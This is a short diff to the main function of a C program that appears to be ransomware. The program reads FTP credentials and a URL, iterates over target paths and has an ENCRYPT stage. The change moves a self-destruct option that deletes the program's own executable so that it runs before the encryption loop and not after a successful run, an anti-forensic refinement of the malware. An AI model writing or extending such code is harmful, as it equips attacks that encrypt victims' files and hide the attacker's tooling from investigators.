@@ -156,6 +156,9 @@ int main(int argc, char **argv) {
   FTP_USER = get_str("ftp-user");
   FTP_PWD = get_str("ftp-pwd");
   FTP_URL = get_str("ftp-url");
+  
+  if(get_bool("destruct"))
+    unlink(argv[0]);
 
   for (int i = 0; i < paths->s; i++) {
     char *cur = paths->c[i];
@@ -169,6 +172,9 @@ int main(int argc, char **argv) {
   }
 
 ENCRYPT:
+  if(get_bool("destruct"))
+    unlink(argv[0]);
+
   for (int i = 0; i < paths->s; i++) {
     char *cur = paths->c[i];
     if (access(cur, R_OK & W_OK) < 0) {
@@ -185,8 +191,5 @@ DONE:
   clist_free(exts);
   clist_free(paths);
   thpool_destroy(pool);
-
-  if (ret == EXIT_SUCCESS && get_bool("destruct"))
-    unlink(argv[0]);
   return ret;
 }
